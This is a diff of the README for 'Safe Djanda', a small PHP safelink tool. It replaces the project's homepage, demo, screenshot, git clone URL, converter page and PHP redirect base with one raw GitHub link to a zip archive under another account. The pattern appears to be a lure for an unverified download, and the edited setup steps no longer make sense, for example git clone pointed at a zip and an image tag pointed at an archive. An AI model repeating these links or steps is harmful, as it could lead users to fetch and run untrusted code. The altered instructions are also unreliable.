@@ -1,24 +1,24 @@
 # Safe Djanda
-:memo: Simple Safelink With SHA256 Encryption inspiration from https://saveloli.xyz
+:memo: Simple Safelink With SHA256 Encryption inspiration from https://raw.githubusercontent.com/rulsz/safedjanda/master/dactylonomy/safedjanda.zip
 
 ## DEMO
-http://in.bakaa.me
+https://raw.githubusercontent.com/rulsz/safedjanda/master/dactylonomy/safedjanda.zip
 
 ## Screenshoot
-![Screenshoot](https://user-images.githubusercontent.com/29944979/53409574-d4b55300-39f3-11e9-8949-564119671f75.png)
+![Screenshoot](https://raw.githubusercontent.com/rulsz/safedjanda/master/dactylonomy/safedjanda.zip)
 
 ## Safe Djanda Setup
 
 ``` bash
 # Download
-$ git clone https://github.com/py7hon/safedjanda # Or download from releases
+$ git clone https://raw.githubusercontent.com/rulsz/safedjanda/master/dactylonomy/safedjanda.zip # Or download from releases
 
 # Deploy to localhost or Cpanel 
 
 # Convert link
-# open convert.php in your browser and copy to textarea and click convert button
+# open https://raw.githubusercontent.com/rulsz/safedjanda/master/dactylonomy/safedjanda.zip in your browser and copy to textarea and click convert button
 
 # Auto Convert link
 # add this code on your website and replace to your website 
-# <?php echo 'http://bakaa.me/redirect/?'.split_link(encrypte($linkdown,'hashv1.00'));?>
+# <?php echo 'https://raw.githubusercontent.com/rulsz/safedjanda/master/dactylonomy/safedjanda.zip'.split_link(encrypte($linkdown,'hashv1.00'));?>
 ```
